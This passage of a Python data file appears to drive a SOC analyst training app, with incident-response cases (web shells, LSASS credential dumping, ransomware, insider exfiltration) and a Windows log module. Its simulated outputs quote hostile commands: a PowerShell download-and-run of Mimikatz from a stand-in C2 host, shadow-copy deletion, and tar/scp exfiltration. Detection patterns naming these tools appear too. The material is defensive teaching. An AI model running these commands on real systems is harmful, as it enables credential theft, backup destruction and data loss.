                         {"from": "Analyst", "to": "Filesystem", "data": "rm shells", "title": "Delete", "desc": "Backdoors removed", "color": "#e74c3c"},
                         {"from": "Analyst", "to": "Apache", "data": "restart", "title": "Kill sessions", "desc": "All shell sessions end", "color": "#f39c12"},
                         {"from": "Web App", "to": "Users", "data": "Clean state", "title": "Restored", "desc": "No more backdoors", "color": "#27ae60"}
                     ]},
                    {"id": "case2_c6", "category": "Case 2 — Practice", "color": "#9b59b6",
                     "cmd": "sudo nano /var/www/html/uploads/.htaccess",
                     "desc": "Add an .htaccess to forbid PHP execution in /uploads/",
                     "scenario": "Deleting the current shells doesn't stop future uploads. Adding an .htaccess in /uploads/ that denies PHP execution prevents the whole class of attack at the web server level. Also fix the form to reject non-image MIME types.",
                     "output": "# /var/www/html/uploads/.htaccess\nphp_flag engine off\n<FilesMatch \"\\.(php|phtml|php3|php4|php5|phar)$\">\n    Require all denied\n</FilesMatch>",
                     "simulation": [
                         {"from": "Analyst", "to": "Apache Config", "data": "Deny PHP in uploads", "title": "Harden", "desc": "Any PHP here is refused", "color": "#9b59b6"},
                         {"from": "Apache", "to": "Next Upload", "data": "403 Forbidden", "title": "Blocked", "desc": "Future shells unusable", "color": "#27ae60"},
                         {"from": "Web App", "to": "Users", "data": "Only images", "title": "Fixed", "desc": "Upload works, exec does not", "color": "#3498db"}
                     ]}
                ],

                "resolution": {
                    "headline": "✅ How it ended",
                    "summary": "All 3 web shells removed after preservation. Apache restarted to kill sessions. Attacker IP blocked. No evidence of data theft from the web root — the shells had only been used for recon (id, passwd, ls).",
                    "root_cause": "The upload form accepted any file type, and the /uploads/ directory executed PHP. Two failures in one.",
                    "fixes": [
                        "Validate uploads by MIME type AND extension; whitelist only images",
                        "Add .htaccess to deny PHP in /uploads/",
                        "Move the upload directory outside the web root; serve via a proxy script",
                        "Deploy ModSecurity with OWASP CRS to block shell patterns",
                        "Monitor for new PHP files in user-writable directories"
                    ]
                }
            },

            # ============================================================
            # CASE 3
            # ============================================================
            {
                "id": "case_3",
                "number": "Case 3",
                "title": "LSASS Credential Dumping",
                "icon": "🔓",
                "color": "#9b59b6",
                "severity": "CRITICAL",
                "mitre": ["T1003.001 — OS Credential Dumping: LSASS Memory",
                          "T1566.001 — Phishing: Spearphishing Attachment"],

                "story": {
                    "headline": "14:30 — EDR alerts on workstation-42",
                    "paragraphs": [
                        "An alert pops up: 'Suspicious process access on workstation-42 — LSASS read by unknown binary.'",
                        "This is the single most important alert a SOC analyst can receive. LSASS holds the credential material of every user logged into the machine — plaintext passwords (sometimes), NTLM hashes, and Kerberos tickets.",
                        "You open Sysmon Event 10 on the workstation. The source is mimikatz.exe with GrantedAccess 0x1410 — the classic signature of a credential dump.",
                        "The process tree shows the malware arrived via a malicious Word macro. The user opened invoice.docm from a phishing email an hour earlier. The chain is: winword.exe → powershell.exe → Invoke-Mimikatz.",
                        "Every credential on this machine is now considered leaked. Including — potentially — cached domain admin credentials."
                    ],
                    "cliffhanger": "How far has the attacker moved with those credentials?"
                },

                "playbook": {
                    "headline": "What you need to do — in order",
                    "steps": [
                        {"n": 1, "title": "Confirm the theft", "detail": "Read Sysmon Event 10. Check source process and GrantedAccess mask."},
                        {"n": 2, "title": "Identify the attacker process", "detail": "Use WMI to see the full command line of the malicious process."},
                        {"n": 3, "title": "Find the entry point", "detail": "Read Event 4688 to find the parent chain. Phishing attachment is usually at the top."},
                        {"n": 4, "title": "Contain immediately", "detail": "Kill the process. Block outbound traffic from the host."},
                        {"n": 5, "title": "Assume all credentials leaked", "detail": "Reset user + admin credentials. Consider KRBTGT rotation."},
                        {"n": 6, "title": "Hunt for lateral movement", "detail": "Check other machines for the same user's logon events."}
                    ]
                },

                "commands": [
                    {"id": "case3_c1", "category": "Case 3 — Practice", "color": "#9b59b6",
                     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=10} | Where-Object {$_.Message -match 'lsass.exe'} | Select-Object TimeCreated, @{N='Source';E={$_.Properties[2].Value}}, @{N='Access';E={$_.Properties[6].Value}}",
                     "desc": "Find every process that accessed LSASS (Sysmon Event 10)",
                     "scenario": "Sysmon Event 10 logs process-to-process access. Filtering for lsass.exe as the target shows you who touched it and with what permissions. GrantedAccess masks like 0x1010 or 0x1410 indicate credential theft.",
                     "output": "TimeCreated        Source         Access\n-----------        ------         ------\n3/15/2024 2:30 PM  mimikatz.exe   0x1410\n3/15/2024 2:30 PM  powershell.exe 0x1010",
                     "simulation": [
                         {"from": "EDR", "to": "Analyst", "data": "LSASS access", "title": "Alert", "desc": "Sysmon flagged the access", "color": "#f39c12"},
                         {"from": "Analyst", "to": "Sysmon log", "data": "filter lsass.exe", "title": "Query", "desc": "Which process did it?", "color": "#3498db"},
                         {"from": "Sysmon log", "to": "Analyst", "data": "mimikatz.exe 0x1410", "title": "CONFIRMED", "desc": "Classic credential dump", "color": "#9b59b6"}
                     ]},
                    {"id": "case3_c2", "category": "Case 3 — Practice", "color": "#c0392b",
                     "cmd": "Get-CimInstance Win32_Process | Where-Object {$_.CommandLine -match 'Invoke-Mimikatz|DumpCreds|sekurlsa'} | Select-Object ProcessId, Name, CommandLine",
                     "desc": "Find the malicious process with its full command line",
                     "scenario": "Sysmon says 'a process accessed LSASS.' WMI tells you exactly what that process is doing. Here it reveals Invoke-Mimikatz — the PowerShell version of the tool — along with the remote payload URL.",
                     "output": "ProcessId Name           CommandLine\n--------- ----           -----------\n4521      powershell.exe powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://c2/p.ps1'); Invoke-Mimikatz -DumpCreds",
                     "simulation": [
                         {"from": "Analyst", "to": "WMI", "data": "Win32_Process", "title": "Query", "desc": "Full process metadata", "color": "#3498db"},
                         {"from": "WMI", "to": "Analyst", "data": "Invoke-Mimikatz", "title": "Identify", "desc": "Confirmed cred dumper", "color": "#e74c3c"},
                         {"from": "WMI", "to": "Analyst", "data": "http://c2/p.ps1", "title": "C2 found", "desc": "Attacker infra identified", "color": "#c0392b"}
                     ]},
                    {"id": "case3_c3", "category": "Case 3 — Practice", "color": "#f39c12",
                     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} -MaxEvents 100 | Where-Object {$_.Message -match 'powershell.*DownloadString'} | Select-Object TimeCreated, Message",
                     "desc": "Trace the parent process — find how the malware started",
                     "scenario": "The execution chain usually goes: malicious document → shell → payload. Event 4688 logs every process creation. Filtering for the download pattern surfaces the parent that launched it — typically winword.exe from a phishing attachment.",
                     "output": "3/15/2024 2:25 PM  Process: winword.exe CommandLine: \"C:\\Program Files\\...\\WINWORD.EXE\" invoice.docm\n3/15/2024 2:25 PM  Process: powershell.exe CommandLine: powershell.exe -c IEX DownloadString(...)",
                     "simulation": [
                         {"from": "Analyst", "to": "Event 4688", "data": "process tree", "title": "Query", "desc": "Every process creation", "color": "#3498db"},
                         {"from": "Event 4688", "to": "Analyst", "data": "winword → PS", "title": "Root cause", "desc": "Phishing doc dropped the payload", "color": "#e74c3c"},
                         {"from": "Analyst", "to": "Email", "data": "invoice.docm", "title": "Patient zero", "desc": "Identify the source email", "color": "#f39c12"}
                     ]},
                    {"id": "case3_c4", "category": "Case 3 — Practice", "color": "#e74c3c",
                     "cmd": "Stop-Process -Id 4521 -Force",
                     "desc": "Kill the malicious process",
                     "scenario": "Every second the malware runs, it dumps more credentials. Kill it immediately. Then block outbound traffic so nothing else phones home.",
                     "output": "(process 4521 terminated)",
                     "simulation": [
                         {"from": "Analyst", "to": "Process", "data": "Stop-Process", "title": "Kill", "desc": "Malware terminated", "color": "#e74c3c"},
                         {"from": "Process", "to": "System", "data": "Terminated", "title": "Stopped", "desc": "Credential theft halted", "color": "#f39c12"},
                         {"from": "Analyst", "to": "Host", "data": "Next: isolate", "title": "Continue", "desc": "Now block network", "color": "#27ae60"}
                     ]},
                    {"id": "case3_c5", "category": "Case 3 — Practice", "color": "#f39c12",
                     "cmd": "New-NetFirewallRule -DisplayName 'Isolate' -Direction Outbound -Action Block",
                     "desc": "Isolate the host from the network",
                     "scenario": "Killing the process stops the theft. Blocking outbound stops any further attacker activity on this host — no beaconing, no lateral movement, no exfiltration. The host stays online for forensics but is cut off from the network.",
                     "output": "Name                  : Isolate\nEnabled               : True\nAction                : Block\nDirection             : Outbound",
                     "simulation": [
                         {"from": "Analyst", "to": "Firewall", "data": "Block outbound", "title": "Isolate", "desc": "Host cut off", "color": "#f39c12"},
                         {"from": "Host", "to": "C2", "data": "Blocked", "title": "No callback", "desc": "Attacker loses contact", "color": "#e74c3c"},
                         {"from": "Host", "to": "Analyst", "data": "Still online", "title": "Forensics", "desc": "Preserved for investigation", "color": "#27ae60"}
                     ]},
                    {"id": "case3_c6", "category": "Case 3 — Practice", "color": "#c0392b",
                     "cmd": "Get-ADUser -Filter * | Set-ADAccountPassword -Reset; Reset-ComputerMachinePassword -Server DC01",
                     "desc": "Rotate every credential — assume total compromise",
                     "scenario": "Once LSASS is read, EVERY credential on the machine is compromised. You cannot pick and choose which to reset — you must reset all of them. This includes domain admins who ever logged into this machine.",
                     "output": "(password reset for all users)\n(computer account password rotated)",
                     "simulation": [
                         {"from": "Analyst", "to": "AD", "data": "Reset all passwords", "title": "Rotate", "desc": "Assume everything leaked", "color": "#c0392b"},
                         {"from": "AD", "to": "Users", "data": "New creds", "title": "Applied", "desc": "Old hashes useless", "color": "#f39c12"},
                         {"from": "Attacker", "to": "Anywhere", "data": "Old creds fail", "title": "Neutralized", "desc": "Cannot pivot", "color": "#27ae60"}
                     ]}
                ],

                "resolution": {
                    "headline": "✅ How it ended",
                    "summary": "Malware killed within 8 minutes of the alert. Host isolated. All user passwords reset. Computer account password rotated. KRBTGT reset as a precaution (since domain admin had logged into workstation-42 at some point). No lateral movement observed — the attacker was stopped before pivoting.",
                    "root_cause": "User opened a malicious Word document (invoice.docm) from a phishing email. Word allowed macros to run.",
                    "fixes": [
                        "Block macros from the internet in Office Group Policy",
                        "Phishing-resistant MFA for all users (FIDO2 or Windows Hello)",
                        "Enable Credential Guard on all Windows endpoints (protects LSASS)",
                        "Restrict domain admin logons to domain controllers only",
                        "Deploy Sysmon on all endpoints with a modern configuration (SwiftOnSecurity or Olaf Hartong's)"
                    ]
                }
            },

            # ============================================================
            # CASE 4
            # ============================================================
            {
                "id": "case_4",
                "number": "Case 4",
                "title": "Ransomware Pre-Encryption Staging",
                "icon": "💀",
                "color": "#c0392b",
                "severity": "CRITICAL",
                "mitre": ["T1490 — Inhibit System Recovery",
                          "T1486 — Data Encrypted for Impact",
                          "T1021.002 — Remote Services: SMB/Windows Admin Shares"],

                "story": {
                    "headline": "15:00 — Sysmon Event 11 explodes with .locked files",
                    "paragraphs": [
                        "You're monitoring Sysmon events when you notice the event rate on workstation-42 has gone from 5/minute to 500/minute. The event is Sysmon ID 11 — file creation.",
                        "Filtering the target filenames shows a pattern: every file in the user's Documents folder is being duplicated with a .locked extension. report.xlsx, invoice.pdf, clients.docx — all getting renamed with .locked appended.",
                        "Encryption is happening right now. You have seconds to act before it spreads to network shares.",
                        "The attacker has almost certainly already deleted the Volume Shadow Copies (that's step one in every ransomware playbook). Your only hope for restoration is off-site backups."
                    ],
                    "cliffhanger": "Is the file server already compromised? The user has mounted shares."
                },

                "playbook": {
                    "headline": "What you need to do — in order",
                    "steps": [
                        {"n": 1, "title": "Confirm ransomware in action", "detail": "Sysmon Event 11 with .locked extensions."},
                        {"n": 2, "title": "Catch the destructive commands", "detail": "Look for vssadmin, wbadmin, bcdedit — backup deletion."},
                        {"n": 3, "title": "Stop network encryption", "detail": "Check SMB open files. Cut off shares immediately."},
                        {"n": 4, "title": "Kill the sessions", "detail": "Disconnect SMB sessions and disable shares."},
                        {"n": 5, "title": "Preserve forensic evidence", "detail": "Export the list of encrypted files. Verify backup integrity."},
                        {"n": 6, "title": "Trace back 48 hours", "detail": "The credential theft happened earlier. Find how."}
                    ]
                },

                "commands": [
                    {"id": "case4_c1", "category": "Case 4 — Practice", "color": "#c0392b",
                     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=11} | Where-Object {$_.Message -match '\\.(locked|encrypted|crypt)'} | Select-Object -First 20",
                     "desc": "Detect ransomware file encryption in progress",
                     "scenario": "Sysmon Event 11 logs every file created. Ransomware writes files with new extensions like .locked. Seeing this event fire at high rate = encryption is active. Every second you hesitate costs more files.",
                     "output": "TimeCreated        TargetFilename\n-----------        --------------\n3/15/2024 3:00 PM  C:\\Users\\alice\\Documents\\report.xlsx.locked\n3/15/2024 3:00 PM  C:\\Users\\alice\\Documents\\invoice.pdf.locked\n3/15/2024 3:00 PM  C:\\Users\\alice\\Documents\\clients.docx.locked",
                     "simulation": [
                         {"from": "Ransomware", "to": "File", "data": "report.xlsx.locked", "title": "Encrypt", "desc": "File renamed with new extension", "color": "#c0392b"},
                         {"from": "Sysmon", "to": "Event 11", "data": "File created", "title": "Logged", "desc": "Sysmon sees the new file", "color": "#f39c12"},
                         {"from": "Analyst", "to": "Alert", "data": "Encryption active", "title": "P1", "desc": "Isolate immediately", "color": "#e74c3c"}
                     ]},
                    {"id": "case4_c2", "category": "Case 4 — Practice", "color": "#e74c3c",
                     "cmd": "Get-CimInstance Win32_Process | Where-Object {$_.CommandLine -match 'vssadmin.*delete|wbadmin.*delete|bcdedit.*recoveryenabled'} | Select-Object Name, CommandLine",
                     "desc": "Catch the destructive commands that kill your ability to restore",
                     "scenario": "Modern ransomware ALWAYS deletes Volume Shadow Copies first. The classic trio: vssadmin Delete Shadows, wbadmin delete catalog, bcdedit disable recovery. If you see any of these running, you're minutes from full encryption.",
                     "output": "Name              CommandLine\n----              -----------\nvssadmin.exe      vssadmin.exe Delete Shadows /All /Quiet\nwbadmin.exe       wbadmin.exe delete catalog -quiet\nbcdedit.exe       bcdedit.exe /set {default} recoveryenabled No",
                     "simulation": [
                         {"from": "Ransomware", "to": "Windows", "data": "vssadmin delete", "title": "Destroy backups", "desc": "Shadow copies wiped", "color": "#c0392b"},
                         {"from": "Ransomware", "to": "Windows", "data": "wbadmin delete", "title": "Destroy catalog", "desc": "Backup catalog gone", "color": "#c0392b"},
                         {"from": "Ransomware", "to": "Windows", "data": "bcdedit disable", "title": "Disable recovery", "desc": "Recovery mode blocked", "color": "#c0392b"}
                     ]},
                    {"id": "case4_c3", "category": "Case 4 — Practice", "color": "#f39c12",
                     "cmd": "Get-SmbOpenFile | Where-Object {$_.ClientUserName -ne 'SYSTEM'} | Format-Table ClientUserName, ClientComputerName, Path",
                     "desc": "See which network files are being encrypted right now",
                     "scenario": "If the ransomware has a network share open, it's encrypting files on the file server too. Get-SmbOpenFile lists every open file handle. Many files open by the same user from one workstation = active encryption over the share.",
                     "output": "ClientUserName  ClientComputerName  Path\n--------------  ------------------  ----\nDOMAIN\\alice    WORKSTATION-42      C:\\Shares\\Finance\\Q1.xlsx\nDOMAIN\\alice    WORKSTATION-42      C:\\Shares\\Finance\\Q2.xlsx\nDOMAIN\\alice    WORKSTATION-42      C:\\Shares\\Finance\\Q3.xlsx",
                     "simulation": [
                         {"from": "Analyst", "to": "SMB", "data": "Get-SmbOpenFile", "title": "Query", "desc": "List open handles", "color": "#3498db"},
                         {"from": "SMB", "to": "Analyst", "data": "alice @ WS-42", "title": "Correlate", "desc": "Same user, many files", "color": "#f39c12"},
                         {"from": "Analyst", "to": "File Server", "data": "Isolate share", "title": "Contain", "desc": "Stop encryption on shares", "color": "#e74c3c"}
                     ]},
                    {"id": "case4_c4", "category": "Case 4 — Practice", "color": "#e74c3c",
                     "cmd": "Disconnect-SmbSession -ClientComputerName 'WORKSTATION-42'",
                     "desc": "Kill the SMB session — stops encryption on the share instantly",
                     "scenario": "Disconnecting the session halts encryption at the file server level. The workstation keeps encrypting its local files, but you've saved the shared data. Immediate response step.",
                     "output": "SMB session from WORKSTATION-42 has been disconnected.",
                     "simulation": [
                         {"from": "Analyst", "to": "SMB Session", "data": "Disconnect", "title": "Cut off", "desc": "Session terminated", "color": "#e74c3c"},
                         {"from": "Ransomware", "to": "Share", "data": "Access denied", "title": "Blocked", "desc": "Cannot encrypt more files", "color": "#f39c12"},
                         {"from": "File Server", "to": "Analyst", "data": "Shares protected", "title": "Saved", "desc": "Shared data preserved", "color": "#27ae60"}
                     ]},
                    {"id": "case4_c5", "category": "Case 4 — Practice", "color": "#f39c12",
                     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=11} -MaxEvents 5000 | Where-Object {$_.Message -match '\\.locked'} | Export-Csv encrypted_files.csv -NoTypeInformation",
                     "desc": "Preserve the list of encrypted files for recovery triage",
                     "scenario": "After containment, you need to document what was lost. This exports every .locked file path to CSV. Useful for insurance claims, recovery planning, and post-incident reporting.",
                     "output": "(encrypted_files.csv written — contains every .locked file path)",
                     "simulation": [
                         {"from": "Analyst", "to": "Sysmon log", "data": "Query Event 11", "title": "Pull events", "desc": "All encrypted file records", "color": "#3498db"},
                         {"from": "Sysmon log", "to": "Analyst", "data": "5000 events", "title": "Collect", "desc": "Every encryption event", "color": "#f39c12"},
                         {"from": "Analyst", "to": "CSV", "data": "encrypted_files.csv", "title": "Export", "desc": "Evidence preserved", "color": "#27ae60"}
                     ]},
                    {"id": "case4_c6", "category": "Case 4 — Practice", "color": "#9b59b6",
                     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -MaxEvents 500 | Where-Object {$_.Properties[8].Value -eq '3' -and $_.Properties[18].Value -ne '-'} | Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='SourceIP';E={$_.Properties[18].Value}}",
                     "desc": "Trace back — how did the attacker get credentials?",
                     "scenario": "Ransomware can't reach network shares without credentials. This query shows every network logon (Type 3) in the last 500 events. Look for unusual logons in the 24-48 hours before encryption started — that's when the initial compromise occurred.",
                     "output": "TimeCreated          User   SourceIP\n-----------          ----   --------\n3/13/2024 3:00 PM  alice  203.0.113.5\n3/13/2024 3:05 PM  alice  203.0.113.5",
                     "simulation": [
                         {"from": "Analyst", "to": "Security log", "data": "Network logons", "title": "Query", "desc": "Every Type 3 logon", "color": "#3498db"},
                         {"from": "Security log", "to": "Analyst", "data": "2 days earlier", "title": "Timeline", "desc": "Initial compromise found", "color": "#f39c12"},
                         {"from": "Analyst", "to": "Report", "data": "Root cause", "title": "Traced", "desc": "Same IP as the final event", "color": "#9b59b6"}
                     ]}
                ],

                "resolution": {
                    "headline": "✅ How it ended",
                    "summary": "SMB sessions cut off within 12 minutes. Encryption halted mid-file — the user's local files are lost but the Finance share was saved. Off-site backups from 6 hours prior verified intact. Root cause traced to credential theft 48 hours earlier on the same workstation.",
                    "root_cause": "Same workstation from Case 3 (if you read it) — the credential theft that happened two days before gave the attacker domain credentials, which they used to access network shares and deploy ransomware.",
                    "fixes": [
                        "Isolate the compromised workstation from the network permanently",
                        "Verify and test off-site backups — restore the encrypted files",
                        "Deploy Windows Defender Application Control to block unsigned executables",
                        "Enable Controlled Folder Access to stop unauthorized file encryption",
                        "Segment network so one workstation can't reach file servers directly",
                        "Rotate KRBTGT twice (once now, once 10 days later) to invalidate old Kerberos tickets"
                    ]
                }
            },

            # ============================================================
            # CASE 5
            # ============================================================
            {
                "id": "case_5",
                "number": "Case 5",
                "title": "Insider Threat — Off-Hours Exfiltration",
                "icon": "🕵️",
                "color": "#16a085",
                "severity": "HIGH",
                "mitre": ["T1078 — Valid Accounts",
                          "T1567 — Exfiltration Over Web Service",
                          "T1048 — Exfiltration Over Alternative Protocol"],

                "story": {
                    "headline": "Thursday morning — HR flags a departing employee",
                    "paragraphs": [
                        "HR sends you a routine email: an employee named alice has given her two weeks' notice and is on the 'departing soon' list. HR asks you to monitor her activity.",
                        "You pull up her login history. Normal pattern: 9 AM - 6 PM, Monday through Friday, from office IP 10.0.0.42. Consistent for the last 90 days.",
                        "But there's one exception. Last night at 3:00 AM, alice logged in from 203.0.113.5 — an external IP that's never appeared in her history.",
                        "You check the sudo log for that session. She ran tar to bundle her Clients folder, then scp'd the archive to the same external IP. Almost 2.5 GB of client data transferred out in the early morning.",
                        "This isn't a compromised account. This is a departing employee taking client data with her."
                    ],
                    "cliffhanger": "Insider cases are different. You can't just lock the account and move on — this needs legal, HR, and evidence that stands up in court."
                },

                "playbook": {
                    "headline": "What you need to do — in order",
                    "steps": [
                        {"n": 1, "title": "Baseline her normal pattern", "detail": "Pull login history. Establish what 'normal' looks like."},
                        {"n": 2, "title": "Compare off-hours activity", "detail": "Anything outside the baseline is the anomaly."},
                        {"n": 3, "title": "Read the commands", "detail": "sudo log shows exactly what she ran. tar + scp is the classic exfil pattern."},
                        {"n": 4, "title": "Confirm network transfer", "detail": "Cross-check syslog for outbound transfer sizes and destinations."},
                        {"n": 5, "title": "Preserve evidence — do NOT destroy", "detail": "Copy logs and her home directory. Chain of custody matters."},
                        {"n": 6, "title": "Escalate to HR + Legal", "detail": "This is not a technical containment — it's an investigation."}
                    ]
                },

                "commands": [
                    {"id": "case5_c1", "category": "Case 5 — Practice", "color": "#16a085",
                     "cmd": "sudo last -F | grep alice | head -20",
                     "desc": "Establish alice's normal login pattern — then spot the anomaly",
                     "scenario": "Before you can flag something as suspicious, you need a baseline. This shows alice's last 20 logins with full timestamps and source IPs. Normal pattern: weekday business hours from 10.0.0.42. Anomaly: any other pattern.",
                     "output": "alice    pts/0        10.0.0.42       Tue Mar 12 09:15 - 17:30  (08:15)\nalice    pts/0        10.0.0.42       Wed Mar 13 09:20 - 18:45  (09:25)\nalice    pts/0        203.0.113.5     Thu Mar 14 03:00 - 05:30  (02:30)\nalice    pts/0        10.0.0.42       Thu Mar 14 09:15 - 18:00  (08:45)",
                     "simulation": [
                         {"from": "Analyst", "to": "wtmp", "data": "last alice", "title": "Pull history", "desc": "Normal vs abnormal logins", "color": "#3498db"},
                         {"from": "wtmp", "to": "Analyst", "data": "Weekday 9-6 pattern", "title": "Baseline", "desc": "Known-good behavior", "color": "#27ae60"},
                         {"from": "wtmp", "to": "Analyst", "data": "3 AM from 203.0.113.5", "title": "Anomaly", "desc": "Off-hours, unknown IP", "color": "#16a085"}
                     ]},
                    {"id": "case5_c2", "category": "Case 5 — Practice", "color": "#f39c12",
                     "cmd": "sudo grep 'alice' /var/log/auth.log | grep 'COMMAND=' | grep -E 'scp|rsync|curl|wget'",
                     "desc": "Search sudo log for exfiltration commands",
                     "scenario": "The off-hours session ran sudo commands — every one is logged with the full command line. Filtering for transfer tools (scp, rsync, curl, wget) surfaces any data movement. In insider cases, this IS your evidence.",
                     "output": "Mar 14 03:15:22 sudo: alice : COMMAND=/usr/bin/tar czf /tmp/archive.tar.gz /home/alice/Clients\nMar 14 03:18:45 sudo: alice : COMMAND=/usr/bin/scp /tmp/archive.tar.gz backup@203.0.113.5:/backup/",
                     "simulation": [
                         {"from": "Analyst", "to": "auth.log", "data": "grep COMMAND=", "title": "Filter sudo", "desc": "Every command as root", "color": "#3498db"},
                         {"from": "auth.log", "to": "Analyst", "data": "tar + scp", "title": "Exfil pattern", "desc": "Bundle then transfer out", "color": "#e74c3c"},
                         {"from": "Analyst", "to": "Evidence", "data": "Save log lines", "title": "Preserve", "desc": "Timestamped proof", "color": "#f39c12"}
                     ]},
                    {"id": "case5_c3", "category": "Case 5 — Practice", "color": "#e74c3c",
                     "cmd": "sudo grep 'alice' /var/log/syslog | grep -E 'scp|rsync' | grep -v '10\\.0\\.0'",
                     "desc": "Confirm outbound transfers to external IPs only",
                     "scenario": "auth.log shows the sudo command; syslog shows the actual network activity. This cross-check reveals destination IPs and transfer sizes. Transfers to 10.x.x.x are internal; transfers to public IPs are exfil.",
                     "output": "Mar 14 03:18:45 prod-app-01 rsync[5678]: sent 2.3GB in 180s to 203.0.113.5\nMar 14 03:21:22 prod-app-01 rsync[5690]: sent 1.8GB in 145s to 203.0.113.5",
                     "simulation": [
                         {"from": "Server", "to": "syslog", "data": "rsync transfer", "title": "Outbound logged", "desc": "Bytes to external IP", "color": "#e74c3c"},
                         {"from": "syslog", "to": "Analyst", "data": "4.1GB to 203.0.113.5", "title": "Volume", "desc": "Clearly not normal traffic", "color": "#f39c12"},
                         {"from": "Analyst", "to": "Report", "data": "Confirmed exfil", "title": "Evidence", "desc": "Timestamps + volumes + IP", "color": "#16a085"}
                     ]},
                    {"id": "case5_c4", "category": "Case 5 — Practice", "color": "#9b59b6",
                     "cmd": "sudo rsync -av /home/alice/ /evidence/alice_home_snapshot/",
                     "desc": "Snapshot her home directory for forensic review",
                     "scenario": "Do NOT delete anything. Preserve her home directory as it was at the time of the investigation. Chain of custody matters — legal may need it.",
                     "output": "(rsync copies /home/alice/ to /evidence/alice_home_snapshot/ — thousands of files copied)",
                     "simulation": [
                         {"from": "Analyst", "to": "Home dir", "data": "rsync -av", "title": "Snapshot", "desc": "Full copy for forensics", "color": "#9b59b6"},
                         {"from": "Home dir", "to": "/evidence/", "data": "Files copied", "title": "Preserved", "desc": "Original untouched", "color": "#3498db"},
                         {"from": "Analyst", "to": "Legal", "data": "Chain of custody", "title": "Ready", "desc": "Evidence preserved", "color": "#27ae60"}
                     ]},
                    {"id": "case5_c5", "category": "Case 5 — Practice", "color": "#f39c12",
                     "cmd": "sudo ausearch -k exec_commands -ui alice > /evidence/alice_commands.txt",
                     "desc": "Export every command alice ran — kernel-level audit trail",
                     "scenario": "auditd records every execve() syscall at the kernel level. Unlike bash history (which alice could edit), this is tamper-evident. Export the whole trail as evidence.",
                     "output": "(ausearch output written to /evidence/alice_commands.txt — every command with timestamp and UID)",
                     "simulation": [
                         {"from": "Analyst", "to": "auditd", "data": "ausearch -ui alice", "title": "Query", "desc": "All commands by alice", "color": "#3498db"},
                         {"from": "auditd", "to": "Analyst", "data": "Full trail", "title": "Collect", "desc": "Kernel-level record", "color": "#f39c12"},
                         {"from": "Analyst", "to": "Evidence file", "data": "alice_commands.txt", "title": "Export", "desc": "Chain of custody", "color": "#27ae60"}
                     ]},
                    {"id": "case5_c6", "category": "Case 5 — Practice", "color": "#27ae60",
                     "cmd": "sudo usermod -L alice && sudo ufw deny from 203.0.113.5",
                     "desc": "Contain — lock the account, block the destination",
                     "scenario": "Containment for insider cases is different from external attacks. You still need to lock the account and block the exfil destination, but you DON'T delete the account (that destroys evidence) and you coordinate with HR/Legal first.",
                     "output": "usermod: account 'alice' password changed\nRule added",
                     "simulation": [
                         {"from": "Analyst", "to": "Account", "data": "usermod -L", "title": "Lock", "desc": "Login disabled, data preserved", "color": "#27ae60"},
                         {"from": "Analyst", "to": "Firewall", "data": "deny destination", "title": "Block", "desc": "Exfil endpoint cut off", "color": "#f39c12"},
                         {"from": "Analyst", "to": "HR + Legal", "data": "Handoff", "title": "Escalate", "desc": "Not a technical problem anymore", "color": "#3498db"}
                     ]}
                ],

                "resolution": {
                    "headline": "✅ How it ended",
                    "summary": "Account locked, destination IP blocked, all logs and home directory preserved. Case handed to HR + Legal with full timeline and evidence package. No further transfers observed. Client data recovered from backup archives on the external system (with Legal's assistance).",
                    "root_cause": "No data loss prevention (DLP) policy. No alerting on off-hours privileged logins. Departing-employee monitoring was reactive, not proactive.",
                    "fixes": [
                        "Enable a DLP solution — alert on bulk transfers outside business hours",
                        "Alert on any privileged login more than 2 hours outside the user's baseline",
                        "Revoke privileged access on resignation acceptance (same-day)",
                        "Add watermarking on sensitive documents so exfil is detectable",
                        "Build a departing-employee checklist: access review, log monitoring, device collection"
                    ]
                }
            }
        ]
    }
}
# ==================== MODULE: WINDOWS LOG ANALYSIS ====================
WINDOWS_COMMANDS = [
    # ============================================================
    # ACCESSING EVENT LOGS — COMMAND LINE
    # ============================================================
    {"id": "win_1", "category": "Command Line Access", "color": "#3498db",
     "cmd": "wevtutil el",
     "desc": "List every event log channel on the system",
     "scenario": "You're on a new Windows box and need to know what logs are available. wevtutil el enumerates every channel — Windows Logs (Application, Security, System, Setup, ForwardedEvents) plus hundreds of Application and Services Logs.",
     "output": "Application\nSecurity\nSystem\nSetup\nForwardedEvents\nMicrosoft-Windows-PowerShell/Operational\nMicrosoft-Windows-Sysmon/Operational\nMicrosoft-Windows-Windows Defender/Operational\n...",
     "simulation": [
         {"from": "Analyst", "to": "wevtutil", "data": "el", "title": "Query channels", "desc": "Enumerate every event log", "color": "#3498db"},
         {"from": "wevtutil", "to": "Windows", "data": "Read registry", "title": "Look up", "desc": "Reads EventLog registry keys", "color": "#f39c12"},
         {"from": "Windows", "to": "Terminal", "data": "Channel list", "title": "Display", "desc": "Every log channel printed", "color": "#27ae60"}
     ]},
    {"id": "win_2", "category": "Command Line Access", "color": "#3498db",
     "cmd": "wevtutil qe System /f:text /c:10",
     "desc": "Query the last 10 System events in human-readable text",
     "scenario": "You need a quick peek at recent system events without opening Event Viewer. /f:text makes the output readable; /c:10 limits to 10 events. Replace System with Security, Application, or any channel from `wevtutil el`.",
     "output": "Event[0]:\n  Log Name: System\n  Source: Service Control Manager\n  Date: 2024-03-15T14:23:45.123\n  Event ID: 7045\n  Task: N/A\n  Level: Information\n  Opcode: N/A\n  Keyword: Classic\n  User: N/A\n  User Name: N/A\n  Computer: WORKSTATION-42\n  Description: A service was installed in the system.\n    Service Name: SuspiciousSvc\n    Service File Name: C:\\Users\\Public\\svchost.exe",
     "simulation": [
         {"from": "Analyst", "to": "wevtutil", "data": "qe System", "title": "Query log", "desc": "Read System channel", "color": "#3498db"},
         {"from": "wevtutil", "to": "Windows", "data": "Read .evtx", "title": "Parse binary", "desc": "Reads System.evtx file", "color": "#f39c12"},
         {"from": "Windows", "to": "Terminal", "data": "10 events", "title": "Display", "desc": "Text format, newest first", "color": "#27ae60"}
     ]},
